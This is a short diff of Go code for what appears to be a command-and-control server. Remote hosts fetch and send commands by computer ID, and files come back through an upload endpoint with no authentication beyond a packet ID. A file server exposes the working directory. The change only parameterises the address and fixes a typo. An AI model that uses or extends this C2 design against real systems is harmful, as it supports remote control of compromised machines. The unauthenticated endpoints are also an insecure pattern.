@@ -21,11 +21,11 @@ type Server struct {
 	hostDb   HostDb
 }
 
-func NewServer() Server {
-	campaign := model.MakeCampgain()
+func NewServer(srvAddr string) Server {
+	campaign := model.MakeCampaign()
 	coder := model.MakeCoder(campaign)
 	w := Server{
-		"127.0.0.1:4444",
+		srvAddr,
 		campaign,
 		coder,
 		MakeCmdDb(), MakeHostDb()}
@@ -58,8 +58,10 @@ func (s *Server) Serve() {
 	clientRouter.HandleFunc("/getCommand/{computerId}", s.getCommand)
 	clientRouter.HandleFunc("/sendCommand", s.sendCommand)
 
-	// No Authentication (only via packetId)
+	// No Authentication
+	// only via packetId:
 	myRouter.HandleFunc("/upload/{packetId}", s.uploadFile)
+	// just use random filenames:
 	myRouter.PathPrefix("/static").Handler(http.FileServer(http.Dir("./"))) // http.Dir is relative to our path prefix!
 
 	// Allow CORS
